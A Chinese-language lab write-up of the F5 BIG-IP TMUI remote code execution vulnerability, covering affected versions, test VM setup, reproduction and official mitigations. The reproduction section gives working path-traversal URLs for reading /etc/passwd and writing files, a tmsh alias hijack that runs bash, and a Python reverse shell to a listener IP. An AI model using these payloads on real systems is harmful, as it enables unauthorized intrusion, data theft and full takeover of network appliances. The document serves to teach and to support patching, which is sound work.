## **0x00简介**

F5 BIG-IP 是美国``F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。 在F5 BIG-IP产品的流量管理用户页面
(TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞，导致可以未授权访问TMUI模块所有功能（包括未公开功能），漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等。

![](https://image.3001.net/images/20201118/1605680696_5fb4be3859ad873a77a08.png!small)

  

##  **0x02漏洞概述**

攻击者可利用该漏洞执行任意系统命令、创建或删除文件、禁用服务、执行任意的Java代码,可获取shell完全控制目标系统。

  

##  **0x03影响范围**

F5 BIG‐IP 15.1.0

F5 BIG‐IP 15.0.0

F5 BIG‐IP 14.1.0‐14.1.2

F5 BIG‐IP 13.1.0‐13.1.3

F5 BIG‐IP 12.1.0‐12.1.5

F5 BIG‐IP 11.6.1‐11.6.5

  

##  **0x04环境搭建**

1.在F5官网注册登录下载试用即可。

https://downloads.f5.com/esd/ecc.sv?sw=BIG-IP&pro=big-ip_v15.x&ver=15.1.0&container=Virtual-Edition

![](https://image.3001.net/images/20201118/1605681005_5fb4bf6d34f3aed75bed4.jpg!small)

![](https://image.3001.net/images/20201118/1605681014_5fb4bf76ed5dc4fdc733b.jpg!small)

2.然后随便选择一个下载地区，下载即可

![](https://image.3001.net/images/20201118/1605681024_5fb4bf80021c43d278ce0.jpg!small)

3.下载完成后，使用VMware导入安装

VMware左上角‘文件’->‘打开‘选择下载好的文件

![](https://image.3001.net/images/20201118/1605681032_5fb4bf882a86c31bd03bd.jpg!small)

![](https://image.3001.net/images/20201118/1605681042_5fb4bf9240c022561a020.jpg!small)

4.配置方面看自己的选择导入后启动即可系统默认账户：root/default登陆后需要修改默认密码

![](https://image.3001.net/images/20201118/1605681051_5fb4bf9b6ff00e51cf125.jpg!small)

![](https://image.3001.net/images/20201118/1605681060_5fb4bfa4ddaa6b1dd84aa.jpg!small)

5.输入config，配置配置ip地址，点两次回车键即可

![](https://image.3001.net/images/20201118/1605681069_5fb4bfad4eb700dadeb79.jpg!small)

![](https://image.3001.net/images/20201118/1605681078_5fb4bfb672a119bb8745b.jpg!small)

6.设置完IP后访问一下链接出现登录页面安装成功 //注要https加IP

https://172.16.1.186/tmui/login.jsp

![](https://image.3001.net/images/20201118/1605681087_5fb4bfbf46024b3b8f92f.jpg!small)

  

##  **0x05漏洞复现**

1.登录管理页面既是漏洞存在的地方，我们使用poc进行测试文件读取：

https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd

![](https://image.3001.net/images/20201118/1605681098_5fb4bfcabaacff2420dde.jpg!small)

https://ip/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts

![](https://image.3001.net/images/20201118/1605681110_5fb4bfd6004bef0348430.jpg!small)

2.写入文件

curl -k -H "Content-Type: application/x-www-form-urlencoded" -X POST -d
"fileName=/tmp/success&content=东塔网络安全学院"
"https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp"

![](https://image.3001.net/images/20201118/1605681121_5fb4bfe184cc82ab5e336.jpg!small)

3.读取文件

curl -k
"https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/tmp/success"

![](https://image.3001.net/images/20201118/1605681130_5fb4bfea064184fb8ed00.png!small)

4\. 修改alias劫持list命令为bash

curl -k
"https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash"

![](https://image.3001.net/images/20201118/1605681144_5fb4bff88a6dcdeb5d5ad.jpg!small)

4.1 写入文件：bash文件

https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/test&content=id

4.2 执行bash文件

https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/test

![](https://image.3001.net/images/20201118/1605681157_5fb4c00553badd7c7d548.jpg!small)

注：因为权限不足无法完成此步操作，在实际环境中可以尝试

5.反弹shell，写入python反弹shell

https://172.16.1.200/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/shell&content=python
-c "import
os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('172.16.1.132',7856));<br>os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

![](https://image.3001.net/images/20201118/1605681168_5fb4c010e4bbda03d073a.jpg!small)

使用kali做监听

![](https://image.3001.net/images/20201118/1605681177_5fb4c01991ec28aaeac97.jpg!small)

执行以下命令反弹shell //没有权限这里没有反弹成功，可在实际环境中测试

![](https://image.3001.net/images/20201118/1605681186_5fb4c02225f3f6ea68dde.jpg!small)

6.利用工具

> https://github.com/theLSA/f5-bigip-rce-cve-2020-5902
>
> https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902

##  **0x06修复建议**

 **1、官方建议可以通过以下步骤暂时缓解影响（临时修复方案）**

1.1使用以下命令登录对应系统：tmsh

1.2编辑 httpd 组件的配置文件；

edit /sys httpd all-properties

1.3文件内容如下 include ' <LocationMatch "...;."> Redirect 404 / </LocationMatch> '

1.4按照如下操作保存文件；

按下 ESC 并依次输入：wq

1.5执行命令刷新配置文件；

save /sys config

1.6重启 httpd 服务。

restart sys service httpd 并禁止外部IP对 TMUI 页面的访问。

 **2、升级到以下版本**

> BIG-IP 15.x: 15.1.0.4
>
> BIG-IP 14.x: 14.1.2.6
>
> BIG-IP 13.x: 13.1.3.4
>
> BIG-IP 12.x: 12.1.5.2
>
> BIG-IP 11.x: 11.6.5.2

## 参考链接

> https://www.cnblogs.com/twosmi1e/p/13290290.html

